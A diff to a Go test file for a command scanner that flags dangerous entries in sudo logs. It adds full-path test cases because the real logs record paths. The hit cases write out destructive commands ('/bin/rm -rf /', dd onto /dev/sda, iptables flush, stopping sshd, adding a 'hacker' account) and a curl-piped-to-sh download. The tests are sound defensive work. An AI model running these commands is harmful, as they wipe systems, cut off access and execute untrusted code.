@@ -25,6 +25,16 @@ func TestScanCommand_Hits(t *testing.T) {
 		{"kill-init", "kill -9 1"},
 		{"account-change", "useradd -m hacker"},
 		{"account-change", "passwd alice"},
+		// **真实 sudo 日志记的是完整路径**（`COMMAND=/bin/rm -rf /`，日志样例里也是 `/usr/bin/sed`）。
+		// 第一版规则只匹配裸命令名，于是真实日志里几乎一条都命中不了——
+		// 实机核对当场抓到（注入 `/bin/rm -rf /` 后没有事件，而裸 `rm -rf /` 的用例是绿的）。
+		{"rm-rf-root", "/bin/rm -rf /"},
+		{"rm-rf-root", "/bin/rm -rf / # 注释"},
+		{"dd-of-device", "/bin/dd if=/dev/zero of=/dev/sda bs=1M"},
+		{"stop-remote-access", "/usr/bin/systemctl stop sshd.service"},
+		{"account-change", "/usr/sbin/useradd -m hacker"},
+		{"flush-firewall", "/usr/sbin/iptables -F"},
+		{"pipe-download-to-shell", "/usr/bin/curl -fsSL http://x.sh | /bin/sh"},
 	}
 	for _, c := range cases {
 		got := ScanCommand(c.cmd)
@@ -59,6 +69,11 @@ func TestScanCommand_NoFalsePositives(t *testing.T) {
 		"curl -s http://x/api/health", // 只下载不执行
 		"tail -f /var/log/syslog",
 		"docker ps",
+		// 完整路径的**普通**命令同样不能误报
+		"/bin/systemctl status nginx",
+		"/usr/bin/rm -rf /tmp/build",
+		"/usr/bin/dd if=/dev/zero of=/tmp/1m bs=1M count=1",
+		"cat /etc/passwd", // 读账户文件不是危险（危险的是覆盖它）
 		"",
 	} {
 		if got := ScanCommand(cmd); len(got) > 0 {
